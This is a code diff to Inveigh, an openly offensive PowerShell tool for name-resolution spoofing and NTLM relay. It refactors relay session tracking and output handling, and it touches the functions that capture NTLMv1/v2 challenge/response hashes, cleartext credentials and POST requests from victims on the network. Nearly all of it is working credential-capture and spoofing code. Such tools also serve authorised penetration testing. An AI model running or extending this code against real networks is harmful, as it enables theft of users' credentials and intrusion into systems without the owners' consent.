@@ -484,13 +484,11 @@ if(!$inveigh)
     $inveigh.requested_host_list = New-Object System.Collections.ArrayList
     $inveigh.requested_host_IP_list = New-Object System.Collections.ArrayList
     $inveigh.DNS_list = New-Object System.Collections.ArrayList
+    $inveigh.session_list = @()
     $inveigh.session_socket_table = [HashTable]::Synchronized(@{})
     $inveigh.session_table = [HashTable]::Synchronized(@{})
     $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})
-    $inveigh.session_user_table = [HashTable]::Synchronized(@{})
-    $inveigh.session_timestamp_table = [HashTable]::Synchronized(@{})
     $inveigh.session_lock_table = [HashTable]::Synchronized(@{})
-    $inveigh.session_privilege_table = [HashTable]::Synchronized(@{})
     $inveigh.session_count = 0
 }
 
@@ -689,6 +687,11 @@ else
 {
     $inveigh.tool = 0
     $inveigh.newline = ""
+}
+
+if($inveigh.relay_running)
+{
+    $inveigh.output_pause = $true
 }
 
 # Write startup messages
@@ -1342,6 +1345,11 @@ while($inveigh.output_queue.Count -gt 0)
 
 }
 
+if($inveigh.relay_running)
+{
+    $inveigh.output_pause = $false
+}
+
 # Begin ScriptBlocks
 
 # Shared Basic Functions ScriptBlock
@@ -1588,7 +1596,7 @@ $SMB_NTLM_functions_scriptblock =
                     }
                     else
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string - not unique") > $null
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB NTLMv2 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
                     }
 
                     if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
@@ -1624,7 +1632,7 @@ $SMB_NTLM_functions_scriptblock =
                     }
                     else
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string - not unique") > $null
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB NTLMv1 challenge/response captured from $source_IP($NTLM_host_string):`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
                     }
 
                     if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
@@ -1977,6 +1985,7 @@ $HTTP_scriptblock =
                     $HTTP_NTLM_host_length = DataLength2 44 $HTTP_request_bytes
                     $HTTP_NTLM_host_offset = DataLength4 48 $HTTP_request_bytes
                     $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes
+                    $HTTP_username_full = $HTTP_NTLM_domain_string + "\" + $HTTP_NTLM_user_string
         
                     if($HTTP_NTLM_length -eq 24) # NTLMv1
                     {
@@ -1988,24 +1997,24 @@ $HTTP_scriptblock =
                         {          
                             $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash) > $null
                         
-                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
+                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                             {
                                 $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv1 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
                             }
 
-                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
+                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                             {
                                 $inveigh.NTLMv1_file_queue.Add($HTTP_NTLM_hash)
                                 $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file) > $null
                             }
 
-                            if($inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
+                            if($inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
                             {
-                                $inveigh.NTLMv1_username_list.Add("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string") > $null
+                                $inveigh.NTLMv1_username_list.Add("$HTTP_source_IP $HTTP_username_full") > $null
                             }
 
                         }
@@ -2021,24 +2030,24 @@ $HTTP_scriptblock =
                         {
                             $inveigh.NTLMv2_list.Add($HTTP_NTLM_hash) > $null
                         
-                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
+                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                             {
                                 $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash") > $null
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_username_full [not unique]") > $null
                             }
 
-                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
+                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                             {
                                 $inveigh.NTLMv2_file_queue.Add($HTTP_NTLM_hash)
                                 $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file) > $null
                             }
 
-                            if($inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")
+                            if($inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
                             {
-                                $inveigh.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string") > $null
+                                $inveigh.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_username_full") > $null
                             }
                         
                         }
@@ -3413,13 +3422,9 @@ $control_scriptblock =
     function OutputQueueLoop
     {
 
-        while($inveigh.output_queue.Count -gt 0)
+        while($inveigh.output_queue.Count -gt 0 -and !$inveigh.output_pause)
         {
-            
-            if($inveigh.console_output)
-            {
-                $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null
-            }
+            $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null
 
             if($inveigh.file_output)
             {
@@ -3618,7 +3623,7 @@ $control_scriptblock =
 # Begin Startup Functions
 
 # HTTP Listener Startup Function 
-function HTTPListener()
+function HTTPListener
 {
     $proxy_listener = $false
     $HTTPS_listener = $false
@@ -3641,7 +3646,7 @@ function HTTPListener()
 Start-Sleep -m 50
 
 # HTTPS Listener Startup Function 
-function HTTPSListener()
+function HTTPSListener
 {
     $proxy_listener = $false
     $HTTPS_listener = $true
@@ -3664,7 +3669,7 @@ function HTTPSListener()
 Start-Sleep -m 50
 
 # Proxy Listener Startup Function 
-function ProxyListener()
+function ProxyListener
 {
     $proxy_listener = $true
     $HTTPS_listener = $false
@@ -3685,7 +3690,7 @@ function ProxyListener()
 }
 
 # Sniffer/Spoofer Startup Function
-function SnifferSpoofer()
+function SnifferSpoofer
 {
 
     if($inveigh.DNS)
@@ -3720,7 +3725,7 @@ function SnifferSpoofer()
 }
 
 # Unprivileged LLMNR Spoofer Startup Function
-function LLMNRSpoofer()
+function LLMNRSpoofer
 {
 
     if($inveigh.DNS)
@@ -3751,7 +3756,7 @@ function LLMNRSpoofer()
 }
 
 # Unprivileged mDNS Spoofer Startup Function
-function mDNSSpoofer()
+function mDNSSpoofer
 {
     $mDNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
     $mDNS_spoofer_runspace.Open()
@@ -3768,7 +3773,7 @@ function mDNSSpoofer()
 }
 
 # Unprivileged NBNS Spoofer Startup Function
-function NBNSSpoofer()
+function NBNSSpoofer
 {
 
     if($inveigh.DNS)
@@ -3799,7 +3804,7 @@ function NBNSSpoofer()
 }
 
 # NBNS Brute Force Spoofer Startup Function
-function NBNSBruteForceSpoofer()
+function NBNSBruteForceSpoofer
 {
     $NBNS_bruteforce_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
     $NBNS_bruteforce_spoofer_runspace.Open()
@@ -3814,7 +3819,7 @@ function NBNSBruteForceSpoofer()
 }
 
 # Control Loop Startup Function
-function ControlLoop()
+function ControlLoop
 {
     if($inveigh.DNS)
     {
@@ -4327,213 +4332,203 @@ Get captured POST requests.
 
 .PARAMETER POSTRequestUnique
 Get unique captured POST request.
+
+.PARAMETER Session
+Get relay session list.
 #>
 
-[CmdletBinding()]
-param
-( 
-    [parameter(Mandatory=$false)][Switch]$Cleartext,
-    [parameter(Mandatory=$false)][Switch]$CleartextUnique,
-    [parameter(Mandatory=$false)][Switch]$Console,
-    [parameter(Mandatory=$false)][Switch]$DNS,
-    [parameter(Mandatory=$false)][Switch]$DNSFailed,
-    [parameter(Mandatory=$false)][Switch]$Learning,
-    [parameter(Mandatory=$false)][Switch]$Log,
-    [parameter(Mandatory=$false)][Switch]$NTLMv1,
-    [parameter(Mandatory=$false)][Switch]$NTLMv2,
-    [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
-    [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
-    [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
-    [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
-    [parameter(Mandatory=$false)][Switch]$POSTRequest,
-    [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,
-    [parameter(Mandatory=$false)][Switch]$Session,
-    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
-)
+    [CmdletBinding()]
+    param
+    ( 
+        [parameter(Mandatory=$false)][Switch]$Cleartext,
+        [parameter(Mandatory=$false)][Switch]$CleartextUnique,
+        [parameter(Mandatory=$false)][Switch]$Console,
+        [parameter(Mandatory=$false)][Switch]$DNS,
+        [parameter(Mandatory=$false)][Switch]$DNSFailed,
+        [parameter(Mandatory=$false)][Switch]$Learning,
+        [parameter(Mandatory=$false)][Switch]$Log,
+        [parameter(Mandatory=$false)][Switch]$NTLMv1,
+        [parameter(Mandatory=$false)][Switch]$NTLMv2,
+        [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
+        [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
+        [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
+        [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
+        [parameter(Mandatory=$false)][Switch]$POSTRequest,
+        [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,
+        [parameter(Mandatory=$false)][Switch]$Session,
+        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
+    )
 
-if($Console -or $PSBoundParameters.Count -eq 0)
-{
-
-    while($inveigh.console_queue.Count -gt 0)
+    if($Console -or $PSBoundParameters.Count -eq 0)
     {
 
-        if($inveigh.output_stream_only)
-        {
-            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
-            $inveigh.console_queue.RemoveAt(0)
-        }
-        else
+        while($inveigh.console_queue.Count -gt 0)
         {
 
-            switch -wildcard ($inveigh.console_queue[0])
+            if($inveigh.output_stream_only)
+            {
+                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
+                $inveigh.console_queue.RemoveAt(0)
+            }
+            else
             {
 
-                {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
+                switch -wildcard ($inveigh.console_queue[0])
                 {
-                    Write-Warning $inveigh.console_queue[0]
-                    $inveigh.console_queue.RemoveAt(0)
-                }
 
-                default
-                {
-                    Write-Output $inveigh.console_queue[0]
-                    $inveigh.console_queue.RemoveAt(0)
+                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
+                    {
+                        Write-Warning $inveigh.console_queue[0]
+                        $inveigh.console_queue.RemoveAt(0)
+                    }
+
+                    default
+                    {
+                        Write-Output $inveigh.console_queue[0]
+                        $inveigh.console_queue.RemoveAt(0)
+                    }
+
                 }
 
             }
-
+            
         }
-         
+
     }
 
-}
-
-if($DNS)
-{
-
-    foreach($DNS in $inveigh.DNS_list)
+    if($DNS)
     {
+
+        foreach($DNS in $inveigh.DNS_list)
+        {
+            
+            if($DNS.StartsWith("1,"))
+            {
+                Write-Output $DNS.Substring(2)
+            }
+
+        }
+
+    }
+
+    if($DNSFailed)
+    {
+
+        foreach($DNS in $inveigh.DNS_list)
+        {
+            
+            if($DNS.StartsWith("0,"))
+            {
+                Write-Output $DNS.Substring(2)
+            }
+
+        }
+
+    }
+
+    if($Log)
+    {
+        Write-Output $inveigh.log
+    }
+
+    if($NTLMv1)
+    {
+        Write-Output $inveigh.NTLMv1_list
+    }
+
+    if($NTLMv1Unique)
+    {
+        $inveigh.NTLMv1_list.Sort()
+
+        foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
+        {
+            $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))
+
+            if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
+            {
+                Write-Output $unique_NTLMv1
+            }
+
+            $unique_NTLMv1_account_last = $unique_NTLMv1_account
+        }
+
+    }
+
+    if($NTLMv1Usernames)
+    {
+        Write-Output $inveigh.NTLMv2_username_list
+    }
+
+    if($NTLMv2)
+    {
+        Write-Output $inveigh.NTLMv2_list
+    }
+
+    if($NTLMv2Unique)
+    {
+        $inveigh.NTLMv2_list.Sort()
+
+        foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
+        {
+            $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))
+
+            if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
+            {
+                Write-Output $unique_NTLMv2
+            }
+
+            $unique_NTLMv2_account_last = $unique_NTLMv2_account
+        }
+
+    }
+
+    if($NTLMv2Usernames)
+    {
+        Write-Output $inveigh.NTLMv2_username_list
+    }
+
+    if($Cleartext)
+    {
+        Write-Output $inveigh.cleartext_list
+    }
+
+    if($CleartextUnique)
+    {
+        Write-Output $inveigh.cleartext_list | Get-Unique
+    }
+
+    if($POSTRequest)
+    {
+        Write-Output $inveigh.POST_request_list
+    }
+
+    if($POSTRequestUnique)
+    {
+        Write-Output $inveigh.POST_request_list | Get-Unique
+    }
+
+    if($Learning)
+    {
+        Write-Output $inveigh.valid_host_list
+    }
+
+    if($Session)
+    {
+        $i = 0
+
+        while($i -lt $inveigh.session_socket_table.Count)
+        {
+
+            if(!$inveigh.session_socket_table[$i].Connected)
+            {
+                $inveigh.session_list[$i] | Where-Object {$_.Status = "disconnected"}
+            }
         
-        if($DNS.StartsWith("1,"))
-        {
-            Write-Output $DNS.Substring(2)
+            $i++
         }
 
+        Write-Output $inveigh.session_list | Format-Table -AutoSize
     }
-
-}
-
-if($DNSFailed)
-{
-
-    foreach($DNS in $inveigh.DNS_list)
-    {
-        
-        if($DNS.StartsWith("0,"))
-        {
-            Write-Output $DNS.Substring(2)
-        }
-
-    }
-
-}
-
-if($Log)
-{
-    Write-Output $inveigh.log
-}
-
-if($NTLMv1)
-{
-    Write-Output $inveigh.NTLMv1_list
-}
-
-if($NTLMv1Unique)
-{
-    $inveigh.NTLMv1_list.Sort()
-
-    foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
-    {
-        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))
-
-        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
-        {
-            Write-Output $unique_NTLMv1
-        }
-
-        $unique_NTLMv1_account_last = $unique_NTLMv1_account
-    }
-
-}
-
-if($NTLMv1Usernames)
-{
-    Write-Output $inveigh.NTLMv2_username_list
-}
-
-if($NTLMv2)
-{
-    Write-Output $inveigh.NTLMv2_list
-}
-
-if($NTLMv2Unique)
-{
-    $inveigh.NTLMv2_list.Sort()
-
-    foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
-    {
-        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))
-
-        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
-        {
-            Write-Output $unique_NTLMv2
-        }
-
-        $unique_NTLMv2_account_last = $unique_NTLMv2_account
-    }
-
-}
-
-if($NTLMv2Usernames)
-{
-    Write-Output $inveigh.NTLMv2_username_list
-}
-
-if($Cleartext)
-{
-    Write-Output $inveigh.cleartext_list
-}
-
-if($CleartextUnique)
-{
-    Write-Output $inveigh.cleartext_list | Get-Unique
-}
-
-if($POSTRequest)
-{
-    Write-Output $inveigh.POST_request_list
-}
-
-if($POSTRequestUnique)
-{
-    Write-Output $inveigh.POST_request_list | Get-Unique
-}
-
-if($Learning)
-{
-    Write-Output $inveigh.valid_host_list
-}
-
-if($Session)
-{
-    $i = 1
-    $session_list = @()
-
-    while($i -le $inveigh.session_socket_table.Count)
-    {
-
-        if($inveigh.session_socket_table[$i].Connected)
-        {
-            $status = "connected"
-        }
-        else
-        {
-            $status = "disconnected"    
-        }
-
-        $session_object = New-Object PSObject
-        Add-Member -InputObject $session_object -MemberType NoteProperty -Name Session $i
-        Add-Member -InputObject $session_object -MemberType NoteProperty -Name System $inveigh.session_socket_table[$i].Client.RemoteEndpoint.Address.IPaddressToString
-        Add-Member -InputObject $session_object -MemberType NoteProperty -Name User $inveigh.session_user_table[$i]
-        Add-Member -InputObject $session_object -MemberType NoteProperty -Name Admin $inveigh.session_privilege_table[$i]
-        Add-Member -InputObject $session_object -MemberType NoteProperty -Name Status $status
-        Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Last Activity" $inveigh.session_timestamp_table[$i]
-        $session_list += $session_object
-        $i++
-    }
-
-    Write-Output $session_list | Format-Table -AutoSize
-}
 
 }
 
